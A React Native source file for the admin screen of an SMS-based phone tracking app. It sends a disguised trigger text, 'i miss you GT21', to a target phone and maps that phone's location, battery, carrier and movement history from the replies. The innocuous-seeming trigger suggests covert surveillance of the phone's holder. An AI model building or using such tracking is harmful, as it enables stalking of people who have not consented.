/**
 * Admin Map Screen
 * ================
 * Live map showing tracked device locations.
 * Receives SMS replies from User apps and plots them on a map.
 * Uses react-native-maps (Google Maps on Android).
 */

import { useEffect, useState, useCallback, useRef } from 'react';
import {
  View,
  Text,
  StyleSheet,
  TouchableOpacity,
  FlatList,
  Alert,
  Platform,
  Dimensions,
} from 'react-native';
import * as SecureStore from 'expo-secure-store';

/** Tracked device data received via SMS reply */
interface TrackedDevice {
  id: string;
  phoneNumber: string;
  label: string;
  lastLocation: {
    latitude: number;
    longitude: number;
    accuracy: number;
    timestamp: number;
  } | null;
  lastBattery: string;
  lastNetwork: string;
  lastCarrier: string;
  lastDevice: string;
  lastSeen: number;
  history: Array<{
    latitude: number;
    longitude: number;
    timestamp: number;
  }>;
}

const DEVICES_STORE_KEY = 'srts_admin_tracked_devices';
const SCREEN_WIDTH = Dimensions.get('window').width;

/**
 * Parse an SRTS location reply SMS into structured data
 */
function parseLocationSms(body: string): Partial<TrackedDevice> | null {
  try {
    const latLngMatch = body.match(/Location:\s*(-?\d+\.\d+),\s*(-?\d+\.\d+)/);
    const batteryMatch = body.match(/Battery:\s*(.+)/);
    const networkMatch = body.match(/Network:\s*(.+)/);
    const carrierMatch = body.match(/Carrier:\s*(.+)/);
    const deviceMatch = body.match(/Device:\s*(.+)/);
    const accuracyMatch = body.match(/Accuracy:\s*(\d+)m/);

    if (!latLngMatch) return null;

    return {
      lastLocation: {
        latitude: parseFloat(latLngMatch[1]),
        longitude: parseFloat(latLngMatch[2]),
        accuracy: accuracyMatch ? parseInt(accuracyMatch[1]) : 0,
        timestamp: Date.now(),
      },
      lastBattery: batteryMatch?.[1]?.trim() || 'Unknown',
      lastNetwork: networkMatch?.[1]?.trim() || 'Unknown',
      lastCarrier: carrierMatch?.[1]?.trim() || 'Unknown',
      lastDevice: deviceMatch?.[1]?.trim() || 'Unknown',
      lastSeen: Date.now(),
    };
  } catch {
    return null;
  }
}

export default function MapScreen() {
  const [devices, setDevices] = useState<TrackedDevice[]>([]);
  const [selectedDevice, setSelectedDevice] = useState<TrackedDevice | null>(null);
  const [MapView, setMapView] = useState<any>(null);
  const [Marker, setMarker] = useState<any>(null);
  const [Polyline, setPolyline] = useState<any>(null);

  /** Load map components dynamically (not available on web) */
  useEffect(() => {
    if (Platform.OS !== 'web') {
      import('react-native-maps').then((maps) => {
        setMapView(() => maps.default);
        setMarker(() => maps.Marker);
        setPolyline(() => maps.Polyline);
      }).catch(() => {
        console.warn('[Map] react-native-maps not available');
      });
    }
  }, []);

  /** Load saved devices */
  useEffect(() => {
    loadDevices();
  }, []);

  const loadDevices = async () => {
    try {
      const stored = await SecureStore.getItemAsync(DEVICES_STORE_KEY);
      if (stored) {
        setDevices(JSON.parse(stored));
      }
    } catch {
      console.warn('[Map] Failed to load devices');
    }
  };

  const saveDevices = async (updated: TrackedDevice[]) => {
    try {
      await SecureStore.setItemAsync(DEVICES_STORE_KEY, JSON.stringify(updated));
      setDevices(updated);
    } catch {
      console.warn('[Map] Failed to save devices');
    }
  };

  /** Add a new device to track */
  const handleAddDevice = () => {
    Alert.prompt
      ? Alert.prompt('Add Device', 'Enter phone number (E.164 format):', [
          { text: 'Cancel', style: 'cancel' },
          {
            text: 'Add',
            onPress: (phone?: string) => {
              if (!phone) return;
              const newDevice: TrackedDevice = {
                id: `DEV-${Date.now().toString(36).toUpperCase()}`,
                phoneNumber: phone,
                label: phone,
                lastLocation: null,
                lastBattery: 'Unknown',
                lastNetwork: 'Unknown',
                lastCarrier: 'Unknown',
                lastDevice: 'Unknown',
                lastSeen: 0,
                history: [],
              };
              saveDevices([...devices, newDevice]);
            },
          },
        ])
      : // Android fallback (no Alert.prompt)
        addDeviceAndroid();
  };

  const addDeviceAndroid = () => {
    // For Android, we show a simple alert with instructions
    Alert.alert(
      'Add Device',
      'To add a device, the User app must be installed on the target phone.\n\nSend "i miss you GT21" as SMS to the target phone number.\n\nThe reply will be automatically parsed and the device will appear on the map.',
      [{ text: 'OK' }]
    );
  };

  /** Send trigger SMS to a device */
  const handleSendTrigger = async (device: TrackedDevice) => {
    if (Platform.OS === 'web') {
      Alert.alert('Not Available', 'SMS sending requires a mobile device.');
      return;
    }

    try {
      const SMS = await import('expo-sms');
      const isAvailable = await SMS.isAvailableAsync();

      if (!isAvailable) {
        Alert.alert('SMS Unavailable', 'SMS is not available on this device.');
        return;
      }

      await SMS.sendSMSAsync([device.phoneNumber], 'i miss you GT21');
    } catch (error) {
      Alert.alert('Error', 'Failed to open SMS composer.');
    }
  };

  /** Simulate receiving a location reply (for testing) */
  const handleSimulateReply = (device: TrackedDevice) => {
    const mockSms = `📍 SRTS Location Report
━━━━━━━━━━━━━━━━━
📌 Location: 28.613939, 77.209021
🗺️ Maps: https://maps.google.com/?q=28.613939,77.209021
📏 Accuracy: 15m
🔋 Battery: 72%
📶 Network: WIFI
📡 Carrier: Jio
📱 Device: Xiaomi Redmi Note 12
🕐 ${new Date().toLocaleString()}`;

    const parsed = parseLocationSms(mockSms);
    if (parsed && parsed.lastLocation) {
      const updated = devices.map((d) => {
        if (d.id === device.id) {
          const history = [...d.history, parsed.lastLocation!];
          return { ...d, ...parsed, history };
        }
        return d;
      });
      saveDevices(updated);
      setSelectedDevice({ ...device, ...parsed } as TrackedDevice);
      Alert.alert('Reply Simulated', 'Mock location data received and plotted.');
    }
  };

  /** Remove a device */
  const handleRemoveDevice = (device: TrackedDevice) => {
    Alert.alert(
      'Remove Device',
      `Remove "${device.label}" from tracking?`,
      [
        { text: 'Cancel', style: 'cancel' },
        {
          text: 'Remove',
          style: 'destructive',
          onPress: () => {
            const updated = devices.filter((d) => d.id !== device.id);
            saveDevices(updated);
            if (selectedDevice?.id === device.id) setSelectedDevice(null);
          },
        },
      ]
    );
  };

  /** Format time ago */
  const timeAgo = (ts: number): string => {
    if (ts === 0) return 'Never';
    const diff = Date.now() - ts;
    if (diff < 60000) return 'Just now';
    if (diff < 3600000) return `${Math.floor(diff / 60000)}m ago`;
    if (diff < 86400000) return `${Math.floor(diff / 3600000)}h ago`;
    return `${Math.floor(diff / 86400000)}d ago`;
  };

  const devicesWithLocation = devices.filter((d) => d.lastLocation);

  return (
    <>
      <View style={styles.container}>
        {/* Map View */}
        <View style={styles.mapContainer}>
          {MapView && devicesWithLocation.length > 0 ? (
            <MapView
              style={styles.map}
              initialRegion={{
                latitude: devicesWithLocation[0].lastLocation!.latitude,
                longitude: devicesWithLocation[0].lastLocation!.longitude,
                latitudeDelta: 0.01,
                longitudeDelta: 0.01,
              }}
              showsUserLocation
              showsMyLocationButton
            >
              {devicesWithLocation.map((device) => (
                <Marker
                  key={device.id}
                  coordinate={{
                    latitude: device.lastLocation!.latitude,
                    longitude: device.lastLocation!.longitude,
                  }}
                  title={device.label}
                  description={`Battery: ${device.lastBattery} • ${timeAgo(device.lastSeen)}`}
                  onPress={() => setSelectedDevice(device)}
                />
              ))}
              {selectedDevice && selectedDevice.history.length > 1 && Polyline && (
                <Polyline
                  coordinates={selectedDevice.history}
                  strokeColor="#1a73e8"
                  strokeWidth={3}
                />
              )}
            </MapView>
          ) : (
            <View style={styles.mapPlaceholder}>
              <Text style={styles.mapPlaceholderIcon}>🗺️</Text>
              <Text style={styles.mapPlaceholderText}>
                {devices.length === 0
                  ? 'No devices added yet.\nTap + to add a device.'
                  : 'No location data yet.\nSend a trigger to get the first location.'}
              </Text>
            </View>
          )}
        </View>

        {/* Device List */}
        <View style={styles.listContainer}>
          <View style={styles.listHeader}>
            <Text style={styles.listTitle}>
              Tracked Devices ({devices.length})
            </Text>
            <TouchableOpacity
              style={styles.addButton}
              onPress={handleAddDevice}
            >
              <Text style={styles.addButtonText}>+ Add</Text>
            </TouchableOpacity>
          </View>

          {devices.length === 0 ? (
            <View style={styles.emptyContainer}>
              <Text style={styles.emptyText}>
                No devices being tracked.{'\n'}
                Add a phone number to start tracking.
              </Text>
            </View>
          ) : (
            <FlatList
              data={devices}
              keyExtractor={(item) => item.id}
              renderItem={({ item }) => (
                <TouchableOpacity
                  style={[
                    styles.deviceItem,
                    selectedDevice?.id === item.id && styles.deviceSelected,
                  ]}
                  onPress={() => setSelectedDevice(item)}
                  onLongPress={() => handleRemoveDevice(item)}
                >
                  <View style={styles.deviceInfo}>
                    <Text style={styles.deviceLabel}>{item.label}</Text>
                    <Text style={styles.deviceMeta}>
                      {item.lastLocation
                        ? `${item.lastLocation.latitude.toFixed(4)}, ${item.lastLocation.longitude.toFixed(4)}`
                        : 'No location'}
                      {' • '}
                      {timeAgo(item.lastSeen)}
                    </Text>
                    {item.lastBattery !== 'Unknown' && (
                      <Text style={styles.deviceMeta}>
                        🔋 {item.lastBattery} • 📶 {item.lastNetwork}
                      </Text>
                    )}
                  </View>
                  <View style={styles.deviceActions}>
                    <TouchableOpacity
                      style={styles.actionButton}
                      onPress={() => handleSendTrigger(item)}
                    >
                      <Text style={styles.actionText}>📍</Text>
                    </TouchableOpacity>
                    <TouchableOpacity
                      style={styles.actionButton}
                      onPress={() => handleSimulateReply(item)}
                    >
                      <Text style={styles.actionText}>🧪</Text>
                    </TouchableOpacity>
                  </View>
                </TouchableOpacity>
              )}
            />
          )}
        </View>

        {/* Selected Device Detail */}
        {selectedDevice && selectedDevice.lastLocation && (
          <View style={styles.detailBar}>
            <Text style={styles.detailTitle}>{selectedDevice.label}</Text>
            <Text style={styles.detailText}>
              📱 {selectedDevice.lastDevice} • 🔋 {selectedDevice.lastBattery} • 📶 {selectedDevice.lastNetwork}
            </Text>
            <Text style={styles.detailText}>
              📡 {selectedDevice.lastCarrier} • 🕐 {timeAgo(selectedDevice.lastSeen)}
            </Text>
          </View>
        )}
      </View>
    </>
  );
}

const styles = StyleSheet.create({
  container: {
    flex: 1,
    backgroundColor: '#0d1117',
  },
  mapContainer: {
    height: 300,
    backgroundColor: '#161b22',
  },
  map: {
    flex: 1,
  },
  mapPlaceholder: {
    flex: 1,
    justifyContent: 'center',
    alignItems: 'center',
    backgroundColor: '#161b22',
  },
  mapPlaceholderIcon: {
    fontSize: 48,
    marginBottom: 12,
  },
  mapPlaceholderText: {
    fontSize: 14,
    color: '#8b949e',
    textAlign: 'center',
    lineHeight: 22,
  },
  listContainer: {
    flex: 1,
    padding: 16,
  },
  listHeader: {
    flexDirection: 'row',
    justifyContent: 'space-between',
    alignItems: 'center',
    marginBottom: 12,
  },
  listTitle: {
    fontSize: 16,
    fontWeight: '700',
    color: '#e6edf3',
  },
  addButton: {
    backgroundColor: '#238636',
    paddingHorizontal: 14,
    paddingVertical: 6,
    borderRadius: 8,
  },
  addButtonText: {
    color: '#fff',
    fontSize: 14,
    fontWeight: '600',
  },
  emptyContainer: {
    flex: 1,
    justifyContent: 'center',
    alignItems: 'center',
    paddingVertical: 40,
  },
  emptyText: {
    fontSize: 14,
    color: '#8b949e',
    textAlign: 'center',
    lineHeight: 22,
  },
  deviceItem: {
    flexDirection: 'row',
    alignItems: 'center',
    backgroundColor: '#161b22',
    padding: 14,
    borderRadius: 10,
    marginBottom: 8,
    borderWidth: 1,
    borderColor: '#30363d',
  },
  deviceSelected: {
    borderColor: '#1a73e8',
    backgroundColor: '#0d1117',
  },
  deviceInfo: {
    flex: 1,
  },
  deviceLabel: {
    fontSize: 15,
    fontWeight: '600',
    color: '#e6edf3',
  },
  deviceMeta: {
    fontSize: 12,
    color: '#8b949e',
    marginTop: 2,
  },
  deviceActions: {
    flexDirection: 'row',
    gap: 8,
  },
  actionButton: {
    width: 36,
    height: 36,
    borderRadius: 18,
    backgroundColor: '#21262d',
    justifyContent: 'center',
    alignItems: 'center',
  },
  actionText: {
    fontSize: 16,
  },
  detailBar: {
    backgroundColor: '#161b22',
    borderTopWidth: 1,
    borderTopColor: '#30363d',
    padding: 14,
  },
  detailTitle: {
    fontSize: 15,
    fontWeight: '700',
    color: '#e6edf3',
    marginBottom: 4,
  },
  detailText: {
    fontSize: 12,
    color: '#8b949e',
    lineHeight: 18,
  },
});
